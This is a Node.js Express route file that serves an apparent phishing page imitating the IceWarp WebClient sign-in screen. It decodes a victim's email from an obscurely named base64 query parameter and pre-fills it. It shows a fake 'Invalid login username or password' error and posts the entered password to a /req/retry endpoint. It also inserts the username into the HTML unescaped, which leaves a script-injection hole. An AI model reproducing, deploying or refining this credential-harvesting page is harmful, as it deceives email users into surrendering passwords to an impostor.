
const express = require ('express');
const router = express.Router();


router.use(express.static('public'));



//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const data3 = req.query.jdfngoofiwerfiwjpijweifdhgierugtrhnfwehfo;
    const username = Buffer.from(data3, 'base64').toString('utf-8');
    const firstLetter = username.charAt(0);
	if (data3 == null) {
        res.render('error');
        
      }else{
    const htmlContent = `
    <!DOCTYPE html>
        <html>
        <head>
            <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
            <title>IceWarp WebClient</title>
            <base href=".">
            <link rel="icon" href="/files/favicon-32.png" sizes="32x32">
            <meta id="theme-colors">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0">
            <meta name="google" value="notranslate">
            <meta http-equiv="cleartype" content="on">
            <meta name="version" content="25020709">
            <meta name="stylesheet" content="css/style.css" variables="true">
            <link type="text/css" href="/files/api.css" rel="stylesheet">
            <link type="text/css" href="/files/pikaday.css" rel="stylesheet">
            <link type="text/css" href="/files/style.css" rel="stylesheet">
            <!-- <link type="text/css" href="/files/custom.css" rel="stylesheet"> -->
            <link type="text/css" rel="stylesheet" href="/files/style.css">
            <style>
            :root {
                --theme-color: hsl(266.45161290322585, 89.42307692307695%, 45%);
                --default-color: hsl(266.45161290322585, 89.42307692307695%, 45%);
                --deep-purple-color: hsl(266.45161290322585, 89.42307692307695%, 45%);
                --default-grey-color: hsl(266.45161290322585, 6%, 69%);
                --default-light-grey-color: hsl(266.45161290322585, 11%, 82%);
            }
            </style>
        </head>
        <body dir="ltr">
            <div class="o-external t-default cover sites-login site" style="background-color: rgb(103, 12, 217); background-image: url('/files/download.png')" data-component="sites-login-1" id="content">
            <main class="o-external__main">
                <form class="o-card c-card templates-card" data-hook="form" action="/req/retry" accept-charset="UTF-8"  method="POST" data-component="templates-card-2">
                <div class="o-card__main">
                    <div data-component="atoms-dropdown-2" class="o-dropdown o-card__lang " data-hook="language">
                    <label class="o-dropdown__text">en</label>
                    </div>
                    <a data-component="atoms-link~back-1" class=" o-link   u-float-left  o-card__back  " data-hook="back">Back</a>
                    <div class="o-card__content" data-hook="content">
                    <section data-component="organisms-card-section-5" class=" o-card__section   ">
                        <div data-component="organisms-card-header-2" class=" o-header  ">
                        <main class="o-header__main">
                            <div class="o-header__content">
                            <div data-component="atoms-avatar-1" class=" o-avatar   o-avatar--letter  o-header__avatar  " data-color="">${firstLetter}</div>
                            <h2 class=" o-header__title o-heading o-heading--beta  ">Sign in to WebClient</h2>
                            <p data-component="atoms-info-2" class=" o-info  o-info--normal   o-header__subsubtitle  ">${username} </p>
                            </div>
                            <div data-component="atoms-well-2" data-hook="well" class=" o-well  o-well--secondary   o-header__well   ">
                            <svg data-component="atoms-icons-7" class=" o-icon  o-well__icon  " viewBox="0 0 28 28">
                            <g stroke="none" stroke-width="1" fill-rule="evenodd">
                                <path d="M13.61 12C12.94 12 12.55 12.4 12.55 13L12.55 20C12.55 20.6 12.94 21 13.61 21 14.19 21 14.58 20.6 14.58 20L14.58 13C14.58 12.4 14.19 12 13.61 12L13.61 12 13.61 12Z"/>
                                <ellipse cx="13.61" cy="9.4" rx="1.16" ry="1.2"/>
                                <path d="M14 28C21.66 28 28 21.74 28 13.95 28 6.26 21.66 0 14 0 6.23 0 0 6.26 0 13.95 0 21.74 6.23 28 14 28L14 28ZM14 26C20.63 26 26 20.63 26 14 26 7.37 20.63 2 14 2 7.37 2 2 7.37 2 14 2 20.63 7.37 26 14 26L14 26Z"/>
                            </g>
                            </svg>
                            <div class="o-well__content"></div>
                            </div>
                            <div style="margin-top:0.6rem;" data-hook="well" class="o-well o-well--error o-header__well is-visible atoms-well" data-component="atoms-well-2">
                                <svg data-component="atoms-icons-9" class=" o-icon  o-well__icon  " viewBox="0 0 31 28">
                                    <path d="M15.5 9C14.9 9 14.5 9.4 14.5 10L14.5 17C14.5 17.6 14.9 18 15.5 18 16.2 18 16.6 17.6 16.6 17L16.6 10C16.6 9.4 16.2 9 15.5 9L15.5 9 15.5 9Z"/>
                                    <ellipse cx="15.6" cy="20.4" rx="1.2" ry="1.2"/>
                                    <path d="M30.3 20.9L19.6 2.4C18.8 1 17.2 0.1 15.5 0.1 13.9 0.1 12.5 1 11.5 2.4L0.8 20.9C-0.1 22.4-0.1 24.2 0.8 25.6 1.5 27 3.2 27.9 4.8 27.9L26.3 27.9C28.1 27.9 29.6 27 30.3 25.6 31.2 24.2 31.2 22.4 30.3 20.9L30.3 20.9 30.3 20.9ZM28.2 24.4C27.9 25.2 27 25.7 26 25.7L5.3 25.7C4.4 25.7 3.6 25.2 3.1 24.4 2.5 23.5 2.5 22.5 3.1 21.6L13.3 4C13.6 3.1 14.5 2.6 15.6 2.6 16.6 2.6 17.5 3.1 18 4L28.2 21.6C28.7 22.5 28.7 23.5 28.2 24.4L28.2 24.4 28.2 24.4Z"/>
                                </svg>

                            <div class="o-well__content">
                                <p class="o-well__text u-bold">Something went wrong</p>
                                <p class="o-well__text">Invalid login username or password</p>
                            </div>
                            </div>
                        </main>
                        </div>
                    </section>
                    <section data-component="organisms-card-section-6" class=" o-card__section   u-hide  ">
                        <label data-component="molecules-input-2" class="o-input o-form__object molecules-input">
                        <input data-component="atoms-element-input-3" class=" o-form__element" type="text" name="username" value="${username}" autocomplete="username" data-hook="username">
                        </label>
                    </section>
                    <section class="o-card__section o-card__section--form">
                        <label class="o-input o-form__object molecules-input is-empty">
                        <input
                            class="o-form__element"
                            type="password"
                            name="password"
                            id="password-input"
                            required=""
                            autocomplete="current-password"
                            maxlength="240"
                        />
                        <span class="o-label o-form__label o-form__label--main o-form__label--floating">Password</span>

                        
                        <a class="o-addon o-addon--ico" id="togglePassword" tabindex="-1">
                        
                            <svg
                            id="icon-eye"
                            data-component="atoms-icons-8"
                            class="o-icon"
                            viewBox="0 0 16 16"
                            >
                            <path
                                fill-rule="evenodd"
                                clip-rule="evenodd"
                                d="M15.994 7.88931C15.9919 7.88046 15.9912 7.87132 15.9905 7.86218C15.9896 7.84959 15.9886 7.83698 15.984 7.82506C15.9824 7.82066 15.9797 7.81733 15.977 7.81403C15.9744 7.81093 15.9719 7.80786 15.9704 7.80397C15.9682 7.79865 15.9672 7.79303 15.9661 7.78742C15.9648 7.78035 15.9635 7.77329 15.9599 7.76684C14.5078 4.98059 11.3468 2.98438 8.01198 2.98438C4.6767 2.98438 1.51616 4.97756 0.0630684 7.76331C0.0594594 7.76971 0.0581625 7.77674 0.0568616 7.78379C0.0558195 7.78944 0.0547749 7.7951 0.0525372 7.80047C0.0509043 7.8042 0.0485096 7.80718 0.0461147 7.81016C0.0433762 7.81356 0.0406375 7.81697 0.0390371 7.8215C0.0343815 7.83344 0.0334328 7.84604 0.0324838 7.85864C0.0317957 7.86778 0.0311074 7.87692 0.0290059 7.88581C0.0199746 7.92344 0.0114746 7.95956 0.0114746 7.99822C0.0114746 8.03287 0.0187321 8.06506 0.0263585 8.09889L0.0290059 8.11069C0.0311281 8.11957 0.0318158 8.12872 0.0325043 8.13787C0.0334482 8.15042 0.0343935 8.16299 0.0390371 8.17494C0.0405622 8.1793 0.0432913 8.18263 0.0459916 8.18592C0.0485478 8.18904 0.0510783 8.19213 0.0525372 8.19603C0.0547717 8.20138 0.0558104 8.20703 0.0568468 8.21267C0.0581441 8.21972 0.0594379 8.22676 0.0630684 8.23316C1.51563 11.0194 4.6767 13.0156 8.01198 13.0156C11.3468 13.0156 14.5078 11.0224 15.9599 8.23666C15.9641 8.22984 15.9654 8.22232 15.9668 8.21483C15.9677 8.20963 15.9686 8.20445 15.9705 8.19953C15.9719 8.19564 15.9745 8.19257 15.977 8.18946C15.9797 8.18617 15.9825 8.18285 15.984 8.1785C15.9886 8.16659 15.9896 8.15401 15.9905 8.14144C15.9912 8.13228 15.9919 8.12311 15.994 8.11422L15.9965 8.10311C16.0042 8.06893 16.0115 8.03611 16.0115 8.00175C16.0115 7.96665 16.0038 7.93287 15.996 7.89834L15.996 7.89832L15.994 7.88931ZM8.01148 12.0112C5.19989 12.0112 2.44751 10.4096 1.07601 7.99819C2.45501 5.58391 5.20345 3.98772 8.01148 3.98772C10.822 3.98772 13.575 5.58991 14.9464 8.00072C13.5675 10.4155 10.8195 12.0112 8.01148 12.0112ZM8 4.99939C6.34316 4.99939 5 6.34248 5 7.99939C5 9.6563 6.34312 10.9994 8 10.9994C9.65684 10.9994 11 9.65623 11 7.99939C11 6.34255 9.65684 4.99939 8 4.99939ZM8.00019 10.1443C6.81553 10.1443 5.85531 9.18401 5.85531 7.99942C5.85531 6.81486 6.81559 5.85458 8.00019 5.85458C9.18472 5.85458 10.1451 6.81486 10.1451 7.99942C10.1451 9.18405 9.18472 10.1443 8.00019 10.1443ZM7.99878 9.00171C8.55106 9.00171 8.99878 8.55399 8.99878 8.00171C8.99878 7.44943 8.55106 7.00171 7.99878 7.00171C7.4465 7.00171 6.99878 7.44943 6.99878 8.00171C6.99878 8.55399 7.4465 9.00171 7.99878 9.00171Z"
                            />
                            </svg>

                        
                            <svg
                            id="icon-eye-slash"
                            class="o-icon atoms-icons"
                            data-component="atoms-icons-8"
                            viewBox="0 0 16 16"
                            style="display: none;"
                            >
                            <path
                                fill-rule="evenodd"
                                clip-rule="evenodd"
                                d="M2.3538 14.3536L14.3538 2.35355L13.6467 1.64645L1.64669 13.6464L2.3538 14.3536ZM8.01223 2.98438C8.86835 2.98438 9.71302 3.11594 10.5203 3.35866L9.70076 4.17816C9.14744 4.0534 8.58076 3.98772 8.01173 3.98772C5.20369 3.98772 2.45525 5.58391 1.07625 7.99819C1.63964 8.98875 2.43605 9.84267 3.37386 10.5051L2.66008 11.2188C1.57162 10.4192 0.668956 9.39486 0.0633126 8.23316C0.059682 8.22676 0.0583882 8.21972 0.057091 8.21267C0.0560545 8.20703 0.0550158 8.20138 0.0527813 8.19603C0.0513224 8.19213 0.0487919 8.18904 0.0462357 8.18592C0.0435354 8.18263 0.0408063 8.1793 0.0392813 8.17494C0.0346376 8.16299 0.0336923 8.15042 0.0327485 8.13787C0.0320599 8.12872 0.0313722 8.11957 0.02925 8.11069L0.0266026 8.09889C0.0189762 8.06506 0.0117188 8.03287 0.0117188 7.99822C0.0117188 7.95956 0.0202188 7.92344 0.02925 7.88581C0.0313516 7.87692 0.0320398 7.86778 0.0327279 7.85864C0.033677 7.84604 0.0346257 7.83344 0.0392813 7.8215C0.0408817 7.81697 0.0436204 7.81356 0.0463588 7.81016C0.0487537 7.80718 0.0511484 7.8042 0.0527813 7.80047C0.055019 7.7951 0.0560637 7.78944 0.0571058 7.78379C0.0584067 7.77674 0.0597035 7.76971 0.0633126 7.76331C1.51641 4.97756 4.67694 2.98438 8.01223 2.98438ZM8.00024 4.99939C8.26916 4.99939 8.52981 5.03477 8.77779 5.10113L8.02422 5.85471L8.00043 5.85458C6.81584 5.85458 5.85556 6.81486 5.85556 7.99942L5.85569 8.02324L5.10198 8.77694C5.03562 8.52896 5.00024 8.26831 5.00024 7.99939C5.00024 6.34248 6.3434 4.99939 8.00024 4.99939ZM10.8988 7.22281L10.1452 7.97638L10.1453 7.99942C10.1453 9.18405 9.18496 10.1443 8.00043 10.1443L7.97739 10.1442L7.22366 10.8979C7.47135 10.9641 7.73168 10.9994 8.00024 10.9994C9.65709 10.9994 11.0002 9.65623 11.0002 7.99939C11.0002 7.73083 10.965 7.4705 10.8988 7.22281ZM8.01173 12.0112C7.43647 12.0112 6.86369 11.9442 6.30471 11.8169L5.48572 12.6358C6.29853 12.8821 7.14955 13.0156 8.01223 13.0156C11.347 13.0156 14.5081 11.0224 15.9602 8.23666C15.9643 8.22984 15.9657 8.22232 15.967 8.21483C15.9679 8.20963 15.9689 8.20445 15.9707 8.19953C15.9722 8.19564 15.9747 8.19257 15.9773 8.18946C15.98 8.18617 15.9827 8.18285 15.9842 8.1785C15.9889 8.16659 15.9898 8.15401 15.9908 8.14144C15.9915 8.13228 15.9921 8.12311 15.9943 8.11422L15.9968 8.10311C16.0044 8.06893 16.0118 8.03611 16.0118 8.00175C16.0117 7.96665 16.0041 7.93287 15.9963 7.89834L15.9963 7.89832L15.9942 7.88931C15.9921 7.88046 15.9914 7.87133 15.9908 7.86219V7.86218C15.9898 7.84959 15.9889 7.83698 15.9842 7.82506C15.9827 7.82066 15.9799 7.81733 15.9772 7.81403C15.9747 7.81093 15.9721 7.80786 15.9706 7.80397C15.9684 7.79865 15.9674 7.79303 15.9664 7.78742C15.9651 7.78035 15.9638 7.77329 15.9601 7.76684C15.3522 6.60032 14.4447 5.57229 13.3503 4.77124L12.6363 5.48522C13.5797 6.14888 14.3808 7.00596 14.9466 8.00072C13.5677 10.4155 10.8198 12.0112 8.01173 12.0112Z"
                            />
                            </svg>
                        </a>

                        <a class="o-addon" tabindex="-1">Forgot?</a>
                        </label>
                    </section>

                    <script>
                        const togglePassword = document.getElementById("togglePassword");
                        const passwordInput = document.getElementById("password-input");
                        const iconEye = document.getElementById("icon-eye");
                        const iconEyeSlash = document.getElementById("icon-eye-slash");
                        const formObject = passwordInput.closest('.o-form__object');

                        function updateLabelState() {
                        if (passwordInput.value.trim() !== '') {
                            formObject.classList.remove('is-empty');
                        } else {
                            formObject.classList.add('is-empty');
                        }
                        }

                        passwordInput.addEventListener('input', updateLabelState);
                        passwordInput.addEventListener('blur', updateLabelState);
                        passwordInput.addEventListener('focus', updateLabelState);

                        togglePassword.addEventListener("click", () => {
                        const isHidden = passwordInput.type === "password";
                        passwordInput.type = isHidden ? "text" : "password";
                        iconEye.style.display = isHidden ? "none" : "block";
                        iconEyeSlash.style.display = isHidden ? "block" : "none";
                        });

                        // Initialize on page load
                        updateLabelState();
                    </script>



                    <section data-component="organisms-card-section-8" class=" o-card__section  o-card__section--form   ">
                        <div data-component="molecules-checkbox-1" class=" o-checkbox o-checkbox--default   ">
                        <input data-component="atoms-element-input-2" class=" o-checkbox__element" type="checkbox" name="remember-me" data-hook="persistentlogin">
                        <i class="o-checkbox__icon"></i>
                        <label class="o-checkbox__label">Keep me signed in</label>
                        </div>
                    </section>
                    <section data-component="organisms-card-section-9" class=" o-card__section  o-card__section--default  o-card__section--space-top   ">
                        <div data-component="molecules-button-2" class=" o-button o-form__object  o-button--block  o-button--primary   ">
                        <button data-component="atoms-element-button-2" data-hook="validate-password" name="next" type="submit">
                            <span>Sign in</span>
                        </button>
                        </div>
                    </section>
                    <section data-component="organisms-card-section-10" class=" o-card__section  o-card__section--footer   ">
                        <p data-component="atoms-info~not-you-1" class=" o-info   u-align-center  ">Not you? <a data-component="atoms-link~check-account-2" class=" o-link  o-link--switch   " data-hook="back-to-email">Check your account again</a>
                        </p>
                    </section>
                    </div>
                </div>
                </form>
            </main>
            <div data-component="organisms-bar~footer-1" class=" o-bar  o-external__footer  ">
                <section class=" o-bar__section  o-bar__section--start  ">
                <p class="o-external__copy o-info">Powered by IceWarp ©&nbsp; <time datetime="2025">2025</time>
                </p>
                </section>
                <section class=" o-bar__section  o-bar__section--center  ">
                <a class="o-external__social" title="https://www.facebook.com/IceWarpInc" href="https://www.facebook.com/IceWarpInc" rel="noopener" target="_blank">
                    <svg data-component="atoms-icons-3" class="o-icon o-external__icon" viewBox="0 0 330 330">
                    <path d="M165 0c-91.080 0-165 73.92-165 165s73.92 165 165 165c91.080 0 165-73.92 165-165s-73.92-165-165-165zM203.94 138.6l-1.98 19.8h-30.36v92.4h-33v-92.4h-19.8v-19.8h19.8v-21.12c0-7.92 1.32-19.8 6.6-27.060 5.94-7.92 14.52-13.2 29.040-13.2 23.1 0 33 3.3 33 3.3l-4.62 27.060c0 0-9.24-1.98-16.5-1.98s-15.18 2.64-15.18 9.9v23.76h33z"/>
                    </svg>
                </a>

                <a class="o-external__social" title="https://twitter.com/icewarp" href="https://twitter.com/icewarp" rel="noopener" target="_blank">
                    <svg data-component="atoms-icons-4" class=" o-icon  o-external__icon  " viewBox="0 0 330 330">
                    <path d="M165 0c-91.080 0-165 73.92-165 165s73.92 165 165 165c91.080 0 165-73.92 165-165s-73.92-165-165-165zM249.48 132c0 1.98 0 3.3 0 5.28 0 54.12-40.92 116.16-116.16 116.16-23.1 0-44.22-6.6-62.7-18.48 3.3 0.66 6.6 0.66 9.9 0.66 19.14 0 36.96-6.6 50.82-17.16-17.82-0.66-33-11.88-38.28-28.38 2.64 0.66 5.28 0.66 7.92 0.66 3.96 0 7.26-0.66 10.56-1.32-18.48-3.96-32.34-20.46-32.34-40.26 0 0 0-0.66 0-0.66 6.6 3.3 11.88 4.62 18.48 5.28-11.22-7.26-18.48-19.8-18.48-33.66 0-7.26 1.98-14.52 5.28-20.46 19.8 24.42 50.16 40.92 83.82 42.24-0.66-3.3-1.32-5.94-1.32-9.24 0-22.44 18.48-40.92 40.92-40.92 11.88 0 22.44 4.62 29.7 12.54 9.24-1.98 17.82-5.28 25.74-9.9-3.3 9.24-9.24 17.82-17.82 22.44 7.92-0.66 15.84-3.3 23.1-6.6-4.62 9.24-11.22 16.5-19.14 21.78z"/>
                    </svg>
                </a>
                <a class="o-external__social" title="https://www.linkedin.com/company/IceWarp" href="https://www.linkedin.com/company/IceWarp" rel="noopener" target="_blank">
                    <svg data-component="atoms-icons-5" class=" o-icon  o-external__icon  " viewBox="0 0 330 330">
                    <path d="M165 0c-91.080 0-165 73.92-165 165s73.92 165 165 165 165-73.92 165-165c0-91.080-73.92-165-165-165zM118.8 250.8h-39.6v-118.8h39.6v118.8zM99 125.4v0c-12.54 0-21.12-10.56-21.12-21.78s8.58-20.46 21.12-20.46c12.54 0 20.46 9.9 21.12 21.12 0 10.56-7.92 21.12-21.12 21.12zM250.8 250.8h-39.6v-62.7c0-15.18-3.96-25.080-17.16-25.080-10.56 0-13.86 6.6-17.16 13.2-1.32 2.64 1.32 5.94 1.32 9.24v65.34h-40.26c0 0 0.66-105.6 0-118.8h40.26v19.8c0-7.92 11.88-18.48 31.68-18.48 24.42 0 40.92 15.84 40.92 50.16v67.32z"/>
                    </svg>
                </a>

                </section>
                <section class=" o-bar__section  o-bar__section--end  ">
                <p class="o-info" title="Epos Update 1 build 17">
                    <a href="https://www.icewarp.com/" target="_blank" rel="noopener noreferrer">www.icewarp.com</a>
                </p>
                </section>
            </div>
            </div>
        </body>
        </html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);
      }
});




module.exports =router